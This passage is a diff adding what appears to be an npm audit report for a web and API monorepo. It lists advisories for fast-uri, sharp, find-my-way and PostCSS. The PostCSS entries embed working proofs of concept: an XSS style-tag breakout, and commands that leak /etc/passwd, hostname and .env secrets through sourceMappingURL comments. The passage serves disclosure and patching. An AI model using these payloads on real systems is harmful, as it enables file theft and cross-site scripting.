@@ -1,0 +1,1242 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1124064,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130720,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158524,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158527,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158530,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1204921,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1239943,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240091,
+          "path": "apps__api>fastify>@fastify/ajv-compiler>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "fast-uri",
+      "target": "3.1.8",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1124066,
+          "path": "apps__web>next>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193725,
+          "path": "apps__web>next>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241331,
+          "path": "apps__web>next>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1138811,
+          "path": "apps__web>next>postcss>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139427,
+          "path": "apps__web>next>postcss>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "nanoid",
+      "target": "3.3.20",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1158506,
+          "path": "apps__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "apps__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.16.0",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1240622,
+          "path": "packages__ai-runtime>@opentelemetry/sdk-node>@opentelemetry/otlp-grpc-exporter-base>@grpc/grpc-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240624,
+          "path": "packages__ai-runtime>@opentelemetry/sdk-node>@opentelemetry/otlp-grpc-exporter-base>@grpc/grpc-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@grpc/grpc-js",
+      "target": "1.14.6",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241209,
+          "path": "apps__web>next>postcss>source-map-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "source-map-js",
+      "target": "1.2.2",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1117015,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1124252,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130709,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139510,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "find-my-way",
+      "resolves": [
+        {
+          "id": 1124273,
+          "path": "apps__api>@nestjs/platform-fastify>find-my-way",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nestjs/platform-fastify",
+      "resolves": [
+        {
+          "id": 1240613,
+          "path": "apps__api>@nestjs/platform-fastify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "sprintf-js",
+      "resolves": [
+        {
+          "id": 1241202,
+          "path": "packages__domain>mammoth>argparse>sprintf-js",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1117015": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    },
+    "1124064": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-v2hh-gcrm-f6hx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-16221\n- https://github.com/fastify/fast-uri/commit/0542a216860fd70c062a4730e620576f62ded057\n- https://github.com/fastify/fast-uri/commit/2d50fbabc80e4d0884fe0f6a98fe118ce6faa353\n- https://github.com/fastify/fast-uri/commit/9438266d6a7ded688c8bc7c4ba506da17f44a17b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.3\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.4\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.1\n- https://github.com/advisories/GHSA-v2hh-gcrm-f6hx",
+      "created": "2026-07-21T22:08:28.000Z",
+      "id": 1124064,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` v4.1.0 and earlier do not treat a literal backslash (U+005C) as an authority delimiter. Node's native WHATWG `URL` (used by `fetch()`, `undici`, and Node's `http`/`https` clients) normalizes `\\` to `/` for special schemes (`http`, `https`, `ws`, `wss`, `ftp`, `file`), so the two parsers extract different hosts from the same input string.\n\nFor example, `http://evil.com\\@allowed.com` is treated by `fast-uri` as host `allowed.com` with userinfo `evil.com\\`, while Node's WHATWG URL parser and `fetch()` see host `evil.com` with path `/@allowed.com`.\n\nApplications that use `fast-uri` to enforce host-based policy (allowlists, denylists, loopback/SSRF filtering, redirect validation, outbound proxy routing) before passing the same URL into Node's URL or `fetch()` consumers see a policy/use desync and can be steered to an unintended destination, including cloud metadata endpoints, loopback, or internal hosts.\n\n### Patches\n\nUpgrade to `fast-uri` v4.1.1, v3.1.4, or v2.4.3.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via literal backslash authority delimiter",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-16221"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <=3.1.3",
+      "github_advisory_id": "GHSA-v2hh-gcrm-f6hx",
+      "recommendation": "Upgrade to version 3.1.4 or later",
+      "patched_versions": ">=3.1.4",
+      "updated": "2026-07-21T22:08:29.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-v2hh-gcrm-f6hx"
+    },
+    "1124066": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__web>next>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/libvips/libvips/security/advisories/GHSA-2fcj-gj27-279x\n- https://github.com/libvips/libvips/security/advisories/GHSA-523x-vhfw-6r76\n- https://github.com/libvips/libvips/security/advisories/GHSA-jmwm-wc68-mhwm\n- https://github.com/libvips/libvips/security/advisories/GHSA-r98w-4fp7-m9c7\n- https://github.com/lovell/sharp/security/advisories/GHSA-f88m-g3jw-g9cj\n- https://github.com/advisories/GHSA-f88m-g3jw-g9cj",
+      "created": "2026-07-21T22:07:17.000Z",
+      "id": 1124066,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA number of vulnerabilities, two rated as \"High\" severity using CVSSv4, have been discovered and fixed in the upstream libvips dependency.\n\nThose processing untrusted input with versions of sharp prior to 0.35.0 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.3, which provides libvips 8.18.3.\n\n#### Using a globally-installed libvips?\n\nPlease ensure you are using the latest libvips 8.18.3.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding GIF, TIFF and VIPS images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadNsgif\", \"VipsForeignLoadTiff\", \"VipsForeignLoadVips\"] });\n```",
+      "reported_by": null,
+      "title": "sharp inherited vulnerabilities in libvips: CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.0",
+      "github_advisory_id": "GHSA-f88m-g3jw-g9cj",
+      "recommendation": "Upgrade to version 0.35.0 or later",
+      "patched_versions": ">=0.35.0",
+      "updated": "2026-07-21T22:07:18.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-f88m-g3jw-g9cj"
+    },
+    "1124252": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q\n- https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad\n- https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3\n- https://github.com/postcss/postcss/releases/tag/8.5.12\n- https://github.com/advisories/GHSA-6g55-p6wh-862q",
+      "created": "2026-07-23T15:06:16.000Z",
+      "id": 1124252,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n    this.map = map\n    let file = map.consumer().file\n    if (!this.file && file) this.file = this.mapResolve(file)\n  }\n}\n```\n\n`PreviousMap` constructor (`lib/previous-map.js:17-29`):\n\n```js\nconstructor(css, opts) {\n  if (opts.map === false) return\n  this.loadAnnotation(css)\n  this.inline = this.startWith(this.annotation, 'data:')\n\n  let prev = opts.map ? opts.map.prev : undefined\n  let text = this.loadMap(opts.from, prev)\n  ...\n}\n```\n\nNote `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.\n\n`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:\n\n```js\nloadAnnotation(css) {\n  let comments = css.match(/\\/\\*\\s*# sourceMappingURL=/g)\n  if (!comments) return\n  let start = css.lastIndexOf(comments.pop())\n  let end = css.indexOf('*/', start)\n  if (start > -1 && end > -1) {\n    this.annotation = this.getAnnotationURL(css.substring(start, end))\n  }\n}\n```\n\n`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.\n\n`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:\n\n```js\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)\n  return this.loadFile(map)\n}\n```\n\n* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.\n* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.\n\n`loadFile` (`lib/previous-map.js:86-92`) is the sink:\n\n```js\nloadFile(path) {\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\n\nThe bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:\n\n```\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThis error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.\n\nTrust-boundary analysis:\n* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.\n* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.\n* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.\n\nPrimitives obtained:\n* (a) **Arbitrary file read** — bytes loaded into Node memory.\n* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.\n* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.\n* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.\n\n## PoC\n\nAll commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.\n\n**Vector 1 — Absolute path, default options (no `from`, no `map`):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  try { p().process(\"a{color:red}\\n/*# sourceMappingURL=/etc/passwd */\"); } \\\n  catch(e){console.log(e.message)}'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThe first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.\n\n**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  p().process(\"a{color:red}\\n/*# sourceMappingURL=../../../../../etc/passwd */\", \\\n              {from:\"/var/www/html/styles/main.css\", map:{inline:false}}) \\\n   .catch(e=>console.log(e.message))'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\n`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Vector 3 — File-existence oracle:**\n\n```bash\n# Existing non-JSON file → throws (file confirmed to exist)\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/etc/passwd */\")'\nSyntaxError: Unexpected token 'r', \"root:x:0:0\"... is not valid JSON\n\n# Non-existent file → returns silently (file confirmed absent)\n$ node -e 'r=require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/no/such/file */\"); console.log(\"ok\")'\nok\n```\n\n**Vector 4 — Custom file-content leak:**\n\n```bash\n$ printf 'API_KEY=sk-secret-12345\\n' > /tmp/server-secret.env\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/tmp/server-secret.env */\")' 2>&1 | head -1\nSyntaxError: Unexpected token 'A', \"API_KEY=sk\"... is not valid JSON\n```\n\nThe first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.\n\n**Filesystem-call trace** (proves the read happens with no opts at all):\n\n```js\nconst fs = require('fs');\nconst orig = fs.readFileSync;\nfs.readFileSync = function(p){\n  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);\n  return orig.apply(this, arguments);\n};\nrequire('postcss')().process('a{}\\n/*# sourceMappingURL=/etc/hostname */');\n// → [FILE READ]: /etc/hostname\n// → SyntaxError: Unexpected token 'D', \"Debian-tri\"... is not valid JSON\n```\n\n## Impact\n\n* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.\n* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).\n* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.\n* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.\n* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.\n\n## Recommended Fix\n\nThe root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:\n\n1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):\n\n   ```js\n   // lib/previous-map.js\n   loadMap(file, prev) {\n     if (prev === false) return false\n     if (prev) { /* unchanged */ }\n     else if (this.inline) {\n       return this.decodeInline(this.annotation)\n     } else if (this.annotation) {\n       let annotation = this.annotation\n       // Reject schemes (other than data:, handled above) and absolute paths.\n       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return\n       if (require('path').isAbsolute(annotation)) return\n       if (!file) return  // No base path → cannot safely resolve.\n       const base = require('path').resolve(require('path').dirname(file))\n       const resolved = require('path').resolve(base, annotation)\n       // Refuse anything that escapes the base directory.\n       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {\n         return\n       }\n       return this.loadFile(resolved)\n     }\n   }\n   ```\n\n2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.\n\nA user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.",
+      "reported_by": null,
+      "title": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45623"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.11",
+      "github_advisory_id": "GHSA-6g55-p6wh-862q",
+      "recommendation": "Upgrade to version 8.5.12 or later",
+      "patched_versions": ">=8.5.12",
+      "updated": "2026-07-23T15:06:17.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-6g55-p6wh-862q"
+    },
+    "1124273": {
+      "findings": [
+        {
+          "version": "9.6.0",
+          "paths": [
+            "apps__api>@nestjs/platform-fastify>find-my-way"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/delvedor/find-my-way/security/advisories/GHSA-c96f-x56v-gq3h\n- https://github.com/delvedor/find-my-way/pull/434\n- https://github.com/delvedor/find-my-way/commit/cfe3fd6168b5ac1594c0820fb83fce251a533fc1\n- https://github.com/delvedor/find-my-way/releases/tag/v9.7.0\n- https://github.com/advisories/GHSA-c96f-x56v-gq3h",
+      "created": "2026-07-23T19:33:15.000Z",
+      "id": 1124273,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nRemotely triggerable DoS in find-my-way when it is used with Node's HTTP/2 server.\n\nThe short version is that `lookup()` passes `req.method` into `find()`, and `find()` indexes `this.trees[method]`. Since `this.trees` is a normal object, HTTP/2 method values like constructor, `toString`, or `__proto__` can resolve inherited object properties instead of returning undefined. The code then treats that value like a router node and crashes when it reaches `currentNode.prefix.length`.\n\n### Patches\n\nUpgrade to v9.7.0.\n\n### Workarounds\n\nDo not use find-my-way with HTTP/2 servers, or validate that the http method is valid beforehand.",
+      "reported_by": null,
+      "title": "find-my-way: DDoS with HTTP2",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-47219"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "find-my-way",
+      "vulnerable_versions": "<=9.6.0",
+      "github_advisory_id": "GHSA-c96f-x56v-gq3h",
+      "recommendation": "Upgrade to version 9.7.0 or later",
+      "patched_versions": ">=9.7.0",
+      "updated": "2026-07-23T19:33:15.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-c96f-x56v-gq3h"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = <REDACTED_POC_PATH_by_secrets_gate>'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
